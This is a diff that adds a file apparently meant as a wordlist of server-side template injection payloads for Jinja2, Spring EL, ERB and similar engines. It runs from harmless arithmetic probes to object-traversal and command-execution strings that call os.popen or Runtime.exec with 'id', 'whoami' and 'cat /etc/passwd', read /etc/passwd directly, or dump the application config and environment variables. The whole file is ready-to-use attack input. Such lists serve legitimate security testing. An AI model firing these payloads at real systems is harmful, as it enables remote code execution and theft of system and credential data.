@@ -1,0 +1,41 @@
+{{7*7}}
+{{7*'7'}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+@(7*7)
+{7*7}
+*{7*7}
+{{7*7}}{{7*7}}
+${{7*7}}
+#{{7*7}}
+${{{7*7}}}
+[[7*7]]
+{{config}}
+{{settings}}
+{{request}}
+{{self}}
+{{''.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.__class__}}
+{{request.environ}}
+{{config.__class__.__mro__}}
+{{config.items()}}
+{{config.__class__.__init__.__globals__}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.System).getenv()}
+<%= 7*7 %>
+<%= File.open('/etc/passwd').read %>
+<%= `id` %>
+<%= `whoami` %>
+{% debug %}
+{% dump %}
